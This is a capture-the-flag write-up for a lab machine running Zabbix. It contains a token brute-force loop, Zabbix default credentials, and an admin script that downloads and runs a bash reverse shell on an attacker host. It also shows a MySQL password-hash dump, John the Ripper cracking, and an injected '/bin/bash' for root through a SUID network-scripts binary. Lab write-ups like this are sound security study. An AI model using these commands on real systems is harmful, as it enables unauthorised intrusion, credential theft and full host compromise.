## Zabbox_WriteUp

# Starting with NMAP : 

```
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
root@kali:~/CTF# nmap -p- 10.10.28.75 -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-13 09:40 UTC
Nmap scan report for ip-10-10-28-75.eu-west-1.compute.internal (10.10.28.75)
Host is up (0.00048s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE             VERSION
22/tcp    open  ssh                 OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http                nginx
3306/tcp  open  mysql               MySQL (unauthorized)
10020/tcp open  abb-hw?
10050/tcp open  tcpwrapped
10051/tcp open  ssl/zabbix-trapper?
33060/tcp open  mysqlx?

```


# Port 10020 look intresting : 
Let's try a connexion useing NETCAT

```

                          ___  __    ____                     
                  ___    / __)(  )  (_  _)   ___              
         ___  ___(___)  ( (__  )(__  _)(_   (___)___  ___     
        (___)(___)       \___)(____)(____)      (___)(___)    
         ____   __    ___  ___  _    _  _____  ____  ____     
        (  _ \ /__\  / __)/ __)( \/\/ )(  _  )(  _ \(  _ \    
         )___//(__)\ \__ \\__ \ )    (  )(_)(  )   / )(_) )   
        (__) (__)(__)(___/(___/(__/\__)(_____)(_)\_)(____/    
         ____  ____  ____  ____  ____  ____  _  _  ____  ____ 
        (  _ \( ___)(_  _)(  _ \(_  _)( ___)( \/ )( ___)(  _ \ 
         )   / )__)   )(   )   / _)(_  )__)  \  /  )__)  )   / 
        (_)\_)(____) (__) (_)\_)(____)(____)  \/  (____)(_)\_) 



        Enter your username : 


```

# admin / administrator deosn't work, after asking to Google, the default credentials for Zabbix instance's "Admin:zabbix" :

```
(thank's Google)
1 Login and configuring user - Zabbix
https://www.zabbix.com › manual › quickstart › login
This is the Zabbix "Welcome" screen. Enter the user name Admin with password zabbix to log in as a Zabbix superuser. When logged in, you will see 'Connected as ...
```

# Second step on the "CLI Password Retriever", type an 4 DIGIT "token" : 

```
root@kali:~# nc 10.10.28.75 10020

                          ___  __    ____                     
                  ___    / __)(  )  (_  _)   ___              
         ___  ___(___)  ( (__  )(__  _)(_   (___)___  ___     
        (___)(___)       \___)(____)(____)      (___)(___)    
         ____   __    ___  ___  _    _  _____  ____  ____     
        (  _ \ /__\  / __)/ __)( \/\/ )(  _  )(  _ \(  _ \    
         )___//(__)\ \__ \\__ \ )    (  )(_)(  )   / )(_) )   
        (__) (__)(__)(___/(___/(__/\__)(_____)(_)\_)(____/    
         ____  ____  ____  ____  ____  ____  _  _  ____  ____ 
        (  _ \( ___)(_  _)(  _ \(_  _)( ___)( \/ )( ___)(  _ \ 
         )   / )__)   )(   )   / _)(_  )__)  \  /  )__)  )   / 
        (_)\_)(____) (__) (_)\_)(____)(____)  \/  (____)(_)\_) 



        Enter your username : 
Admin            
        Sending token to Admin@localhost.thm

        Type your 4 digit token : 
```


# Let's buid a script to brut that (In BASH OFC) :

```
root@kali:/tmp# cat brut-it 
#!/bin/bash

for token in $(seq 1 9999); do
        echo Admin > rep.dat #Build the first response with the Username 
        echo 5545 >> rep.dat #Try the DIGIT 5545
        echo "[-] Request num $token" #LOG
        nc 10.10.28.75 10020 < rep.dat #Payload
done

```

##PUT IN Result BRUT


# We found the Zabbix Admin password in the hidden WebDir given by the Brut-forced CLI PASSWORD RETRIEVER:

```
 Password Retriever V 1.0

                          ___  __    ____                     
                  ___    / __)(  )  (_  _)   ___              
         ___  ___(___)  ( (__  )(__  _)(_   (___)___  ___     
        (___)(___)       \___)(____)(____)      (___)(___)    
         ____   __    ___  ___  _    _  _____  ____  ____     
        (  _ \ /__\  / __)/ __)( \/\/ )(  _  )(  _ \(  _ \    
         )___//(__)\ \__ \\__ \ )    (  )(_)(  )   / )(_) )   
        (__) (__)(__)(___/(___/(__/\__)(_____)(_)\_)(____/    
         ____  ____  ____  ____  ____  ____  _  _  ____  ____ 
        (  _ \( ___)(_  _)(  _ \(_  _)( ___)( \/ )( ___)(  _ \ 
         )   / )__)   )(   )   / _)(_  )__)  \  /  )__)  )   / 
        (_)\_)(____) (__) (_)\_)(____)(____)  \/  (____)(_)\_) 
        

Admin Account Password :
REDACTED
```

# Let's found and exploitation for Zabbix !

A classic one is a CVE-2013-3628 but the MSF exploit doesn't work properly, We have to exploit this vulnerability manually.
Do to that go on "Administration" Tab (and find the app_flag) and create a new script.

# Setup the good script pattern :
"Scope = Manual host action"
"Type = Script"
"Execute on = zabbix server"

Script :
```
curl http://10.10.161.27:8080/rev -o /tmp/rev && bash /tmp/rev
```
And SAVE that new script !


# Create a reverse_shell script and start an HTTP server (using python http.server module) :
```
root@kali:/tmp# cat rev 
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.161.27/9999 0>&1
root@kali:/tmp# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

# Start the listener on port 9999 :
```
nc -lnvp 9999
```


# Now we have to lunch it, to do that go on "Monitoring" tab, clic on the zabbix server and select the script created before. Result a reverse shell on the Zabbix Host.

# Stabilize the shell using Spawn TTY :
```
/usr/bin/script -qc /bin/bash /dev/null
```

# zabbix user can run mysql as root without password.

Dumping the username and password from the "users" table in the ZABBIX database: 

```
select username,passwd from users;
+----------+--------------------------------------------------------------+
| username | passwd                                                       |
+----------+--------------------------------------------------------------+
| Admin    | $2y$10$uOQjVPor7FJ6KisO7kvO6OIaaXG2kMJzh2RwcoA387uvd1JLBfx6. |
| guest    | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |
| andrew   | REDACTED                                                     |

The user "andrew" is present in the passwd document in the zabbix server and have an HOME directory. Let's broke the hash to try the password on the host !

```
echo 'REDACTED_HASH' > 4john && john 4john --wordlist=/usr/share/wordlists/seclists/Password/xato-net-10-million-passwords.txt
```

Now we have an SSH account with the user "andrew".

# An SUID is present on a ELF executable in the andrew HOME directory nammed "vpn".

Enumerate this executable using strings :
```
echo 'type the network NAME :' && read NAME && echo $NAME > name.txt && echo 'type de Device name :' && read DEVICE && echo $DEVICE > device.txt
echo NAME=$(cat name.txt) > /etc/sysconfig/network-scripts/ifcfg-1337
echo DEVICE=$(cat device.txt) >> /etc/sysconfig/network-scripts/ifcfg-1337
/etc/sysconfig/network-scripts/ifcfg-1337
;*3$"

```

# For PrivEsc, we can abuse the "network-scripts" using an know vulnerability found here : https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f

# exploiting network-script :

```
[andrew@appliance ~]$ ./vpn
type the network NAME :
a & /bin/bash
type de Device name :
az
********************************************************************************

Zabbix frontend credentials:

Username: Admin

Password: zabbix


To learn about available professional services, including technical suppport and training, please visit https://www.zabbix.com/services

Official Zabbix documentation available at https://www.zabbix.com/documentation/current/

Note! Do not forget to change timezone PHP variable in /etc/php-fpm.d/zabbix.conf file.


********************************************************************************
[root@appliance ~]# 

```

app_flag : in zabbix app / administration/scripts/
USER_FLAG : /home/andrew/user.txt
ROOT_FLAG : /root/root.txt
flag (yes just flag) /.flag.txt

# hidden_flag : hidden in the scipt /root/CLIPWD/
```
[root@appliance root]# echo 'VlZaYVMxTnRWWGhpU0ZwclZsUkdiMXBXVm05aFIxSjBWbXhXYVUxRk5YWlhiR1JQWTJ4S1dWZHRlR3BpYlh$' | base64 -d
VVZaS1NtVXhiSFprVlRGb1pWVm9hR1J0VmxWaU1FNXZXbGRPY2xKWVdteGpibXbase64: invalid input
[root@appliance root]# echo 'VVZaS1NtVXhiSFprVlRGb1pWVm9hR1J0VmxWaU1FNXZXbGRPY2xKWVdteGpibX' | base64 -d
UVZKSmUxbHZkVTFoZVVoaGRtVlViME5vWldOclJYWmxjbmbase64: invalid input
[root@appliance root]# echo 'UVZKSmUxbHZkVTFoZVVoaGRtVlViME5vWldOclJYWmxjbm' | base64 -d
QVJJe1lvdU1heUhhdmVUb0NoZWNrRXZlcnbase64: invalid input
[root@appliance root]# echo 'QVJJe1lvdU1heUhhdmVUb0NoZWNrRXZlcn' | base64 -d
ARI{REDACTED}base64: invalid input 

```

## GALE OVER !
